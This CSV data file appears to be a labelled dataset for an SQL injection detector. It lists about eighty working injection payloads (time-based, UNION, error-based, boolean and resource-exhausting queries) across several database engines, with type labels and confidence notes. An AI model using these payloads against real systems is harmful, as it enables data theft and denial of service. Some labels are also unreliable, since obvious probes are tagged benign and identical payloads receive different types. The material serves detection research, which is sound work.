id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
22662,"1 ) where 5073 = 5073 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.85,"Rule: generic keywords. Heuristic: 500000000 constant = heavy_query DoS confirmed",2
22663,"1"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",time_blind,mysql,0.70,"Rule: rlike() (P3). Heuristic: boolean structure. sleep(5) visible - time_blind takes priority",1
22664,"-4830"" ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""dyut"" = ""dyut",boolean_blind,postgresql,0.70,"Rule: generic keywords. Heuristic: boolean structure. PostgreSQL CAST for error injection",2
22665,"1"" ) as fcrx where 2929 = 2929 and 2820 = 5133",boolean_blind,generic,0.70,"Rule and Heuristic: AND equality (2820 = 5133). Generic boolean-blind",2
22666,"-8414%"" ) union all select 2795#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT structure confirmed",2
22667,select sleep ( 5 ) and ( ( ( 'iwwa' like 'iwwa,time_blind,mysql,0.85,"Rule and Heuristic: sleep(5) (P5, MySQL). Time-based blind confirmed",2
22668,1 ) ) and ( 3020 = 3020 ) *6703 and ( ( 3078 = 3078,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Arithmetic expression without context",2
22669,"1 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )",error_based,mysql,0.85,"Rule: generic keywords. Heuristic: heavy_query. extractvalue() (P4) error-based extraction confirmed",2
22670,"-9770' ) ) as ovhh where 7903 = 7903 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.85,"Rule and Heuristic: ctxsys.drithsx (P4, Oracle). Error-based extraction confirmed",2
22671,1'|| ( select 'tcfy' where 4546 = 4546 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) ) ||',time_blind,postgresql,0.85,"Rule and Heuristic: pg_sleep(5) (P5, PostgreSQL). Time-based blind confirmed",2
22672,"-4580"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""dbhb"" = ""dbhb",boolean_blind,generic,0.70,"Rule: generic keywords. Heuristic: boolean structure. MSSQL CONVERT() for type casting",2
22673,1 ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.85,"Rule and Heuristic: sleep(5) (P5, MySQL). Time-based blind confirmed",2
22674,-8051 ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 5637 = 5637,boolean_blind,firebird,0.70,"Rule: generic keywords. Heuristic: boolean structure. Firebird rdb$database system table access",2
22675,1' and ( 3435 = 7210 ) *7210 and 'lxxt' = 'lxxt,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Arithmetic expression without clear injection",2
22676,"-3068%"" ) ) union all select 6597,6597,6597,6597,6597,6597,6597,6597--",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with eight columns",2
22677,"1"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( ""pnsz"" like ""pnsz",time_blind,mysql,0.85,"Rule and Heuristic: benchmark() (P5, MySQL). Time-based blind via heavy computation",2
22678,"-2725"" union all select 3671,3671,3671,3671,3671#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with five columns",2
22679,1' ) ) as cyom where 2318 = 2318 and 7533 = 7533--,boolean_blind,generic,0.70,"Rule and Heuristic: AND equality (7533 = 7533). Generic boolean-blind",2
22680,1 where 3956 = 3956,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Simple WHERE equality",2
22681,"1"" ) where 4971 = 4971 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.85,"Rule and Heuristic: benchmark() (P5, MySQL). Time-based blind via heavy computation",2
22682,"-3205"" ) union all select 5233,5233,5233,5233#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with four columns",2
22683,"1"" ) and 8677 = 9054#",boolean_blind,generic,0.70,"Rule and Heuristic: AND equality (8677 = 9054). Generic boolean-blind",2
22684,"1"" ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""oyfz"" = ""oyfz",heavy_query,db2,0.70,"Rule: generic keywords. Heuristic: boolean structure. DB2 system table cartesian join (3 tables)",2
22685,"1"" ) where 5870 = 5870 union all select null,null,null--",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with three null columns",2
22686,"1 where 7158 = 7158 or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,0.85,"Rule: elt() (P3). Heuristic: boolean structure. sleep(5) takes precedence - time_blind confirmed",2
22687,1 ) ) and 4637 = 1408 and ( ( 6509 = 6509,boolean_blind,generic,0.70,"Rule and Heuristic: AND equality (4637 = 1408). Generic boolean-blind",2
22688,"1"" ) where 2570 = 2570 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.70,"Rule: generic keywords. Heuristic: boolean structure. DB2 system table cartesian join (3 tables)",2
22689,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""yxes"" like ""yxes",time_blind,sqlite,0.85,"Rule and Heuristic: randomblob(500000000/2) (P5, SQLite). Time-based delay via blob generation",2
22690,"-4325' or make_set ( 9354 = 9354,7185 )",benign,generic,0.50,"Rule: generic keywords. Heuristic: benign. make_set() context lacks clear injection",2
22691,"1"" and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.85,"Rule: generic keywords. Heuristic: 500000000 constant = heavy_query DoS confirmed",2
22692,"1' ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'cfhi' like 'cfhi",error_based,mysql,0.85,"Rule: generic keywords. Heuristic: heavy_query. extractvalue() (P4) error-based extraction confirmed",2
22693,"1' ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.85,"Rule: generic keywords. Heuristic: heavy_query. generate_series(1,5000000) = PostgreSQL DoS confirmed",2
22694,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""xxug"" = ""xxug",heavy_query,generic,0.85,"Rule: generic keywords. Heuristic: 500000000 constant = heavy_query DoS confirmed",2
22695,"1"" order by 1#",benign,generic,0.50,"Rule: no signal. Heuristic: benign. ORDER BY reconnaissance without injection",2
22696,"1"" ) ) as ycvh where 4523 = 4523 and sleep ( 5 ) #",time_blind,mysql,0.85,"Rule and Heuristic: sleep(5) (P5, MySQL). Time-based blind confirmed",2
22697,1%' ) ) ) and 9198 = 9198--,boolean_blind,generic,0.70,"Rule and Heuristic: AND equality (9198 = 9198). Generic boolean-blind",2
22698,1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'zjun' = 'zjun,time_blind,postgresql,0.85,"Rule and Heuristic: pg_sleep(5) (P5, PostgreSQL). Time-based blind confirmed",2
22699,1 ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.85,"Rule and Heuristic: sleep(5) (P5, MySQL). Time-based blind confirmed",2
22700,"1"" ) as dfmm where 7563 = 7563 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.85,"Rule: generic keywords. Heuristic: heavy_query. generate_series(1,5000000) = PostgreSQL DoS confirmed",2
22701,"1 ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.85,"Rule: generic keywords. Heuristic: heavy_query. randomblob(500000000/2) = SQLite DoS confirmed",2
22702,"1%"" ) ) ) and 8438 = 7620--",boolean_blind,generic,0.70,"Rule and Heuristic: AND equality (8438 = 7620). Generic boolean-blind",2
22703,1 and 7533 = 7533,boolean_blind,generic,0.70,"Rule and Heuristic: AND equality (7533 = 7533). Generic boolean-blind",2
22704,"1 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,0.85,"Rule: generic keywords. Heuristic: heavy_query. generate_series(1,5000000) = PostgreSQL DoS confirmed",2
22705,"1' where 6953 = 6953 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.70,"Rule: generic keywords. Heuristic: boolean structure. Firebird system table cartesian join (4 tables)",2
22706,"-5198 ) ) ) union all select 7089,7089,7089,7089,7089,7089,7089,7089#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with eight columns",2
22707,"1"" ) ) as wugz where 5355 = 5355 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.85,"Rule and Heuristic: benchmark() (P5, MySQL). Time-based blind via heavy computation",2
22708,"1%' ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.70,"Rule: generic keywords. Heuristic: boolean structure. Firebird system table cartesian join (4 tables)",2
22709,"1"" ) where 1144 = 1144 and 2006 = 2006",boolean_blind,generic,0.70,"Rule and Heuristic: AND equality (2006 = 2006). Generic boolean-blind",2
22710,1%' ) rlike sleep ( 5 ) and ( '%' = ',time_blind,mysql,0.85,"Rule and Heuristic: sleep(5) (P5). RLIKE context with time delay - time_blind confirmed",2
22711,"1 ) where 7748 = 7748 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.70,"Rule: generic keywords. Heuristic: boolean structure. Firebird system table cartesian join (4 tables)",2
22712,"-9171 ) union all select 6880,6880,6880,6880,6880,6880,6880#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with seven columns",2
22713,-1772' or 7911 = 4985#,boolean_blind,generic,0.70,"Rule and Heuristic: OR equality (7911 = 4985). Generic boolean-blind",2
22714,"1' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'zjxk' = 'zjxk",boolean_blind,generic,0.70,"Rule: generic keywords. Heuristic: boolean structure. MSSQL sysusers table cartesian join (7 tables)",2
22715,"1' ) where 9091 = 9091 union all select null,null,null,null#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with four null columns",2
22716,1' and ( 1088 = 7530 ) *7530 and 'xkfu' = 'xkfu,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Arithmetic expression without clear context",2
22717,"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'cssb' = 'cssb",time_blind,sqlite,0.85,"Rule and Heuristic: randomblob(500000000/2) (P5, SQLite). Time-based delay via blob generation",2
22718,"1' and make_set ( 4952 = 7129,7129 )",benign,generic,0.50,"Rule: generic keywords. Heuristic: benign. make_set() context lacks clear injection",2
22719,1 ) and 3861 = 5813--,boolean_blind,generic,0.70,"Rule and Heuristic: AND equality (3861 = 5813). Generic boolean-blind",2
22720,1 ) as afxc where 7497 = 7497,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Simple WHERE equality",2
22721,1' where 8537 = 8537 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",error_based,oracle,0.85,"Rule and Heuristic: xmltype() (P4, Oracle). Error-based extraction confirmed",2
22722,-1711 ) where 9098 = 9098 order by 1#,benign,generic,0.50,"Rule: no signal. Heuristic: benign. ORDER BY reconnaissance without injection",2
22723,1' in boolean mode ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) #,time_blind,postgresql,0.85,"Rule and Heuristic: pg_sleep(5) (P5, PostgreSQL). Time-based blind confirmed",2
22724,1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),time_blind,mysql,0.85,"Rule and Heuristic: sleep(5) (P5, MySQL). Time-based blind confirmed",2
22725,1' ) where 2928 = 2928 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.85,"Rule and Heuristic: sleep(5) (P5, MySQL). Time-based blind confirmed",2
22726,"1 ) as cnpv where 4902 = 4902 and elt ( 1210 = 1210,sleep ( 5 ) ) --",time_blind,mysql,0.85,"Rule: elt() (P3). Heuristic: boolean structure. sleep(5) takes precedence - time_blind confirmed",2
22727,"-2582'+ ( select ggim where 5346 = 5346 union all select 5346,5346#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with two columns",2
22728,"1 ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.85,"Rule: generic keywords. Heuristic: heavy_query. randomblob(500000000/2) = SQLite DoS confirmed",2
22729,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 'crkz' = 'crkz",boolean_blind,firebird,0.70,"Rule: generic keywords. Heuristic: boolean structure. Firebird system table cartesian join (4 tables)",2
22730,"1' ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.85,"Rule and Heuristic: dbms_pipe.receive_message() (P5, Oracle). Time-based blind confirmed",2
22731,"-6381%"" or 8571 = 8571--",boolean_blind,generic,0.70,"Rule and Heuristic: OR equality (8571 = 8571). Generic boolean-blind",2
22732,1' ) as jlae where 1650 = 1650,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Simple WHERE equality",2
22733,"1' where 2774 = 2774 union all select null,null,null,null,null#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with five null columns",2
22734,"1%"" ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ""%"" = """,heavy_query,generic,0.85,"Rule: generic keywords. Heuristic: 500000000 constant = heavy_query DoS confirmed",2
22735,1 where 7038 = 7038,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Simple WHERE equality",2
22736,1'+ ( select basp where 6953 = 6953,boolean_blind,generic,0.70,"Rule: generic keywords. Heuristic: boolean structure. Generic SQL without strong signal",2
22737,"1' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'eqle' = 'eqle",boolean_blind,generic,0.70,"Rule: generic keywords. Heuristic: boolean structure. MSSQL sysusers table cartesian join (7 tables)",2
22738,-8486%' ) ) ) or 8571 = 8571--,boolean_blind,generic,0.70,"Rule and Heuristic: OR equality (8571 = 8571). Generic boolean-blind",2
22739,"-3393"" ) ) union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with ten columns",2
22740,"-6642' ) where 3459 = 3459 union all select 3459,3459,3459,3459,3459,3459,3459,3459,3459#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with nine columns",2
22741,"1 ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.85,"Rule: generic keywords. Heuristic: 500000000 constant = heavy_query DoS confirmed",2
